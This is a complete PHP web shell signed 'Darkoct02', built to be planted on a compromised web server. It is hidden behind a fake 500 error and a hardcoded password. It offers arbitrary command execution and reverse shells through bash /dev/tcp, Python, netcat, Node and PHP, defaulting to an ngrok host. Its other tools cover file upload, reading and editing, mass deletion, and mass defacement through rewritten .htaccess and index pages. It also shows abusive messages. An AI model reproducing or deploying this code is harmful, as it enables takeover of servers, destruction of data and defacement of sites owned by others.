<?php
error_reporting(0);
set_time_limit(0);
session_start();
$password = array();
$password[0] = "021004";
$dis = @ini_get('disable_functions');
$uname = "<font color='white' size='3'>".php_uname()."</font>";

function login_shell() {
?>
<?php
if ($_GET['oct']=="gans")
{

echo '<center><form method="post"><body bgcolor=black>
<img src="https://logopond.com/logos/bccf7e7149eda9e2c6cb37d35c0ac4b6.png"><br>
<input type="password" name="password" style="height:20px;margin-top:4px;width:250px;background:black;color:lime;border:1px solid bl;padding:2px;padding:14px 10px;text-align:center;font-size:20px;border:1px blue dotted;"/></body>';
}else{
header('HTTP/1.1 500 Internal Error');
die();
}
if($_POST['password'] != $password[0]){
echo '<script>alert("I Will Fuck Ur Mom :D");</script>';
	}
?>
<?php
exit;
}

if($_POST['password']==$password[0]){ 
  $_SESSION['oct'] = 1; }
if($_SESSION['oct']==1){ 
  '';}else{login_shell();}
if($_POST['out'])
{ 
	echo "<form action='?' method=POST>Sayonara Sucker!";
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>SHUT UP BITCH?</title>
<style>
body{
color:white;
background:black;
font-size:15px;
}
#content tr:hover{
background-color: blue;
text-shadow:1px 0px 10px #fff;
border:1px solid white;
}
#content .first{
background-color: grey;
}
table{
border: 1px black dotted;
}
a{
color:#ffffff;
text-decoration: none;
}
a:hover{
color:green;
}
input,select,textarea{
border: 1px solid white;
background:transparent;
color:gold;
border-radius:5px;
}
</style>
</head>
<body><br>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

echo '</td></tr><tr><td>';
echo '<br><form method="POST" enctype="multipart/form-data">
<input type="radio" name="ut" value="default" checked>Default
<input type="radio" name="ut" value="root">Document Root
</input>
<br>
<input type="file" name="your_file"><input type="submit" name="upn" value="upload"><br><br></form>';
if($_POST['upn']=="upload" && $_POST['ut']=="default"){
	if(move_uploaded_file($_FILES['your_file']['tmp_name'],$path.'/'.$_FILES['your_file']['name'])){
		echo "<font color='lime'>Sukses"
		;}else{echo "<font color='red'>Fail";}
	}elseif($_POST['upn']=="upload" && $_POST['ut']=="root"){
		$host = $_SERVER['HTTP_HOST'];
		$fname = $_FILES['your_file']['name'];
		if(move_uploaded_file($_FILES['your_file']['tmp_name'],$_SERVER['DOCUMENT_ROOT'].'/'.$fname)){
			echo "Sukses > <a href=".$host.'/'.$fname." target='blank'>$host";
		}else{
			echo "<font color='red'>Failed :|";
		}
	}

if($_GET['log']=="out"){ 
  echo '<script>window.location="?";</script>';
  unset($_SESSION['oct']);}
if($_GET['do'] == 'backconnect') { 
  echo '<form method="POST" value=""><font color="green"><center><select name="choose"><option value="bash">Bash</option><option value="python">Python</option><option value="netcat">Netcat</option><option value="php">Php</option><option value="node">Nodejs</option>
       <font color="green"><input type="text" name="host" value="0.tcp.ngrok.io" style="margin-left:7px;"><input type="text" name="port" value="80800" style="width:90px;margin-left:2px;"><input type="submit" name="back" value="back">';
  if($_POST['back']) { 
    if($_POST['choose'] == 'bash') { 
      $command = 'bash -i >& /dev/tcp/'.$_POST['host'].'/'.$_POST['port'].' 0>&1';
      execute($command);
    
    }elseif($_POST['choose'] == 'python') { 
      $command = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$_POST['host'].'",'.$_POST['port'].'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
      execute($command);
    }elseif($_POST['choose'] == 'netcat') { 
      $command = 'nc -e /bin/sh '.$_POST['host'].' '.$_POST['port'];
      execute($command);
    }elseif($_POST['choose'] == 'node') {
    	$command = "require('child_process').exec('bash -i >& /dev/tcp/".$_POST['host']."/".$_POST['port']." 0>&1')";
    	execute($command);
    }elseif($_POST['choose'] == 'php') { 
      $command = 'php -r \'$sock=fsockopen("'.$_POST['host'].'",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'';
      execute($command);
    
    }  
    } 
}

function execute($cmd) { 
  if(function_exists('system')) { 
    @ob_start();
    @system($cmd);
    $result = @ob_get_contents();
    @ob_end_clean();
  }elseif(function_exists('passhtru')) { 
    @ob_start();
    passhtru($cmd);
    $result = ob_get_contents();
    ob_end_clean();
  }elseif(function_exists('shell_exec')) { 
     $result = @shell_exec($cmd); 
     
  }
  if($result == null){
  	$result = "null";}
  return $result;   
}

if($_GET['do'] == 'cmd') { 
  echo '<form method="POST"><input type="text" name="com" value="command">
  <input type="submit" name="run"> ';
  if($_POST['run']) { 
    echo "<pre><font color='red'>".execute($_POST['com']);
   
 }
}

  
if(@ini_get('disable_functions') == null){ 
  $dis = '<font color="white" size="3">Safe';}else{ $dis = @ini_get('disable_functions');}

if($_GET['info']=="system"){
	echo "<font color='cyan' size='3'>System : $uname<br>";
	echo "Disable : $dis";}
echo '<center><b><br><font color="gold"><a href="?read=file">[ Read File ] </a>|<a href="?rename=self">[ Rename Self ] </a> | <a href="?mass=delete">[ Mass Delete ] </a> | </a> |<a href="?do=cmd">[ Command ] </a>| <a href="?do=backconnect">[ Backconnect ] </a>| <a href="?info=system">[ Information ] </a>| <a href="?make=file">[ Make File ] </a>| <a href="?show=uploader">[ Uploader V2 ] </a>| <a href="?mass=deface">[ Mass Deface ]</a> | <a href="?change=index">[ Change Index ] </a>| <a href="?">[ Refresh ] </a>| <a href="?log=out">[ LogOut ] </a>
</font>';



	
function tamp_r(){
	echo "<form method='POST'><br><br><br><input type='text' name='vdir' value='".$_SERVER["SCRIPT_FILENAME"]."' style='width:560px'><br><br><br>
	<textarea cols='70' rows='50' readonly>";
	if($_POST['vdir']){
		if(is_file($_POST['vdir'])){
			echo htmlspecialchars(file_get_contents($_POST['vdir']));
		}else{
			echo "</textarea><script>alert('Not File/Denied');</script>";}
	}

}
if($_GET['read']=="file"){
	return tamp_r();
}
	
if($_GET['show']=="uploader"){
	uploaderv2();
}

function mas_del($val){ 
  if(is_dir($val) && $val != ".." ){
  	 foreach (scandir($val) as $new_a) {
  	 	$new_b = $val.'/'.$new_a;
  	 	if(is_file($new_b)){
  	 		if(unlink($new_b)){
  	 			echo "<pre><font color='green'>Deleted $new_b";
  	 		}else{
  	 			echo "<pre><font color='red'>Fail $new_b";}
  	 	}
  	 	
}
 }
 }
function tamp_madel(){ 
	echo "
	<u>Deatination</u><br><form method='post'>
	<input type='text' name='dest' value='".getcwd()."' size='48px;'>
   <input type='submit' name='go' value='delete'>";
   if($_POST['go'] && $_POST['dest']){ 
     return mas_del($_POST['dest']);
   }
} 
if($_GET['mass']=="delete"){
	return tamp_madel();
}
function uploaderv2(){  
  echo '</center><font color="white"><br><br><form method="POST" enctype="multipart/form-data"><input type="file" name="drk_file" style="margin-bottom:7px;">
  <br>Dir  : <input type="text" value="'.getcwd().'" style="width:240px;height:20px;" name="value_dir">
  <br>Name : <input type="text" value="15.php" name="file_name" style="width:100px;height:20px;">
  <input type="submit" name="upload" value="Upload!" style="margin-left:10px;"> ';}
  if($_POST['upload']=="Upload!"){
    if(move_uploaded_file($_FILES['drk_file']['tmp_name'],$_POST['value_dir'].'/'.$_POST['file_name'])){
    	echo '<center><br><font color="white">Sukses Upload';}else{echo '<font color="red"><center><br>Failed Upload';}
  }
 
if($_POST['kntl']){
	if(file_put_contents($_POST['asede'].'/'.$_POST['nama'],$_POST['content'])){
		echo '<br><font color="lime" size="4">Writed at '.$_POST['asede'].'/'.$_POST['nama'];}else{echo '<font color="red" size="3">Failed';}
	}
function make_file(){
	echo '<form method="POST" action="?do"><center><br><font color="white" size="4px"> Destination : <br><input type="text" name="asede" style="width:486px;margin-bottom:10px;" value="'.getcwd().'">
	<br><textarea cols="66" rows="11" name="content" style="margin-bottom:5px;">You Got Hacked By Darkoct02</textarea><br><input type="text" name="nama" value="README.txt"><input type="submit" name="kntl" value="Make It"></input></form>';   }
if($_GET['make']=="file"){
	return make_file();}	
if($_GET['change']=="index"){return changeindex();}
function changeindex(){
	echo '<br><center><br><form method="POST" action="?do"><textarea cols="60" rows="10" name="content">Hacked By Darkoct02</textarea><br><input type="submit" name="change" value="change!" style="width:486px;margin-top:10px;">
	'; 
  
} 
function ren(){
	echo "<form method='POST'><br><br><input type='text' style='width:220px;' name='nme' value='".$_SERVER['SCRIPT_NAME']."'>
	</form>";
	if($_POST['nme']){
		if(rename($_SERVER['SCRIPT_FILENAME'],$_POST['nme'])){
			echo "<font color='green'>Rename sukses</font>";
			
		}else{
			echo "<font color='red'>Failed :(";}
	}
}
if($_GET['rename']=="self"){
	return ren();
	
	
}
if($_POST['change']){
	if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess','DirectoryIndex hel.html') && file_put_contents($_SERVER['DOCUMENT_ROOT'].'/hel.html',$_POST['content'])){
		$hostt = $_SERVER['HTTP_HOST'];
		echo '<br><center><font color="lime">Done => <a href="http://'.$hostt.'" target="_blank">http://'.$hostt;		
		}else{echo '<font color="red"><center><br>Failed!';}
		}
function massdeface(){ 
  echo '<form method="POST"><center><br><font color="white">Destination : <br><input type="text" name="dest" style="width:486px;margin-bottom:10px;" value="'.getcwd().'">
  <textarea cols="60" rows="10" name="content">You Got Hacked By Darkoct02</textarea><br>
  <input type="text" name="name_file" style="width;8px;margin-left:4px;" value="15.php">
  <input type="submit" name="goat" value="click me!" style="width:90px;">';
  if($_POST['goat']){
  	return ewe_mass($_POST['dest'],$_POST['content'],$_POST['name_file']);
  }
 }

function ewe_mass($dir,$content,$name_file){ 
  if(is_dir($dir)){
    foreach (scandir($dir) as $new_dir){ 
      $dir_kontol = $dir.'/'.$new_dir;
      $path_default = $dir_kontol.'/'.$name_file;
      if(is_dir($dir_kontol)){
        if(file_put_contents($path_default,$content)){
          echo '<pre><font color="green" size="1px">Done > '.$path_default.'</font>';}else{echo '</br><font color="red">Fail >'.$dir_kontol;}
          
          }}
          
          }else{echo '<br><font color="red">Not Directory';}
} 
if($_GET['mass']=="deface"){ 
  return massdeface();}
  
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
	
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=70 rows=15 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);}
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>